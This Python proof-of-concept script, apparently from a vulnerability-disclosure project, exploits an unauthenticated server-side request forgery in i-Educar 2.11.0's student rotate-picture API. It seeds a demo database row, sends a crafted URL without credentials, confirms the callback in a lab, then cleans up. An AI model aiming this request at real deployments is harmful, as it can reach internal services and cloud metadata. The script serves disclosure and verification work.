#!/usr/bin/env python3
"""VULN 06 — unauthenticated SSRF in StudentRotatePictureController::rotate().

`POST /api/students/{student}/rotate-picture` takes the `url` request field and
passes it straight to `Image::make($url)`. The route has no authentication and
no host allowlist, so the i-Educar server performs an outbound HTTP request to
any address the caller chooses (internal services, cloud metadata, ...).

The PoC starts a loopback callback server, seeds the prerequisite
`cadastro.fisica_foto` row for a demo student, sends the request without any
session or token, and proves the callback was hit. Everything it seeds is
removed again.
"""

from __future__ import annotations

import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from lib import evidence, http_util, lab_guard, poc_cli
from lib import lab as lab_mod  # noqa: E402

VULN = {
    "id": "06",
    "slug": "student-rotate-picture-ssrf",
    "title": "Unauthenticated SSRF in StudentRotatePictureController::rotate()",
    "product": "i-Educar",
    "affected_version": "2.11.0 (latest release, tag 2.11.0)",
    "cwe_id": "CWE-918",
    "cwe_name": "Server-Side Request Forgery (SSRF)",
    "cwe_source_url": "https://cwe.mitre.org/data/definitions/918.html",
    "cwe_confidence": "high",
    "cwe_justification": (
        "The server fetches an attacker-supplied URL without scheme, host or DNS checks, "
        "which is exactly CWE-918. CWE-441 (confused deputy) is the broader concept and "
        "CWE-611 (XXE) concerns XML entities, which are not involved here."
    ),
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
    "cvss_score": 8.6,
    "endpoint": "POST /api/students/{student}/rotate-picture",
    "params": ["url", "angle"],
    "precondition": "none (unauthenticated); the student needs a cadastro.fisica_foto row, seeded by the PoC",
    "reported_at": "",
    "followups": [],
    "silence_days": 0,
    "status": "verified",
    "blocked_reason": "",
    "screenshots": [
        "evidence/screenshots/06-student-rotate-picture-ssrf-01-callback-proof.png",
    ],
    "advisory_url": "https://github.com/i-explorar/i-explorar/blob/main/vulns/06-student-rotate-picture-ssrf/README.md",
}

STUDENT_ID = 3
REMOTE_FILENAME = "i_explorar_poc06.jpg"
LOOKUP_SQL = f"SELECT ref_idpes FROM pmieducar.aluno WHERE cod_aluno = {STUDENT_ID};"
STORAGE_FILE = f"storage/app/public/ieducar/{REMOTE_FILENAME}"


def _compose(lab: Path, *args: str) -> list[str]:
    return lab_mod.compose(lab, *args)


def _psql(lab: Path, sql: str, *, log: evidence.EvidenceLog) -> str:
    cmd = _compose(lab, "exec", "-T", "postgres", "psql", "-U", "ieducar", "-d", "ieducar", "-tAc", sql)
    log.command(" ".join(cmd))
    proc = subprocess.run(cmd, cwd=lab, capture_output=True, text=True, timeout=120)
    output = (proc.stdout + proc.stderr).strip()
    log.block("psql output", output or "(empty)")
    return output


def run(target: str, *, verbose: bool = False) -> dict:
    lab_guard.check_target(target)

    vuln_dir = Path(__file__).resolve().parent
    lab = lab_mod.lab_dir()
    log = evidence.EvidenceLog(vuln_dir)
    notes: list[str] = []
    log.write(f"# target: {target}")

    callback = http_util.CallbackServer(port=0)
    callback.start()
    log.write(f"# callback server listening on 0.0.0.0:{callback.port}")

    client = http_util.HttpClient(target, verbose=verbose)
    response = None
    try:
        lookup = _psql(lab, LOOKUP_SQL, log=log)
        student_idpes = None
        for line in lookup.splitlines():
            if line.strip().isdigit():
                student_idpes = line.strip()
        if not student_idpes:
            log.write("# could not resolve the student's idpes on this lab")
            return {"vulnerable": False, "evidence": [str(log.path)], "notes": "student idpes not found"}
        log.write(f"# student {STUDENT_ID} -> idpes {student_idpes}")
        seed_sql = (
            "INSERT INTO cadastro.fisica_foto (idpes, caminho) VALUES "
            f"({student_idpes}, 'http://example.invalid/{REMOTE_FILENAME}') "
            "ON CONFLICT (idpes) DO UPDATE SET caminho = EXCLUDED.caminho;"
        )
        _psql(lab, seed_sql, log=log)

        payload_url = f"http://host.docker.internal:{callback.port}/ssrf-poc"
        log.write(f"# POST /api/students/{STUDENT_ID}/rotate-picture (no session, no token)")
        log.write(f"# url={payload_url}")
        response = client.post(
            f"/api/students/{STUDENT_ID}/rotate-picture",
            data={"url": payload_url, "angle": "90"},
            headers={"Accept": "application/json"},
        )

        callback.wait_for_hit(timeout=15)
        hit = bool(callback.requests)
        if hit:
            first = callback.requests[0]
            log.write("")
            log.write("### callback server received")
            log.write(f"method={first['method']} path={first['path']}")
            for key, value in first["headers"].items():
                log.write(f"header: {key}: {value}")
        else:
            log.write("# callback server received no request within 15s")

        log.write("")
        log.write(f"### rotate-picture response HTTP {response.status}")
        log.block("body", response.text.strip() or "(empty)")

        vulnerable = hit and response.status == 200
        notes.append(
            f"outbound request from the i-Educar container observed at {first['path']!r}"
            if hit
            else "no callback received"
        )
    finally:
        callback.stop()
        cleanup = subprocess.run(
            _compose(lab, "exec", "-T", "php", "rm", "-f", STORAGE_FILE),
            cwd=lab,
            capture_output=True,
            text=True,
            timeout=120,
        )
        log.command(f"docker compose exec -T php rm -f {STORAGE_FILE}")
        log.block("cleanup output", (cleanup.stdout + cleanup.stderr).strip() or "(empty)")
        _psql(lab, f"DELETE FROM cadastro.fisica_foto WHERE idpes = {student_idpes};", log=log)
        log.close()

    if response is not None and response.status != 200:
        notes.append(f"HTTP {response.status} from rotate-picture")
    return {"vulnerable": vulnerable, "evidence": [str(log.path)], "notes": "; ".join(notes)}


def main(argv: list[str] | None = None) -> int:
    return poc_cli.poc_main(VULN, run, argv, __file__)


if __name__ == "__main__":
    sys.exit(main())
